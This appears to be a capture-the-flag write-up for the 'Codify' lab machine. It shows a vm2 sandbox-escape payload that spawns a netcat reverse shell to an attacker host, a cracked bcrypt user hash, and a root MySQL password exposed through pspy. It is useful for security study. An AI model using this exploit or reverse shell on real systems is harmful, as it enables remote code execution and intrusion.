<font size="10">Codify</font>

### Difficulty:

`easy`


# Enumeration

```
echo '10.10.11.238 codify.htb' | sudo tee -a /etc/hosts
```


The vm2 library is a widely used and trusted tool for sandboxing JavaScript.

# Foothold

```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.3.3.7 1337 >/tmp/f');
}
`

console.log(vm.run(code));
```

tickets.db in /var/www/contact with a user table
```
3	joshua	$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```


```
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt.gz
```

# Privilege Escalation

Run script with sudo
```
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Use pspy to check the password
```
2023/11/05 15:16:41 CMD: UID=0     PID=43930  | /bin/bash /opt/scripts/mysql-backup.sh
2023/11/05 15:16:41 CMD: UID=0     PID=43929  | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES;
2023/11/05 15:16:41 CMD: UID=0     PID=43931  |
```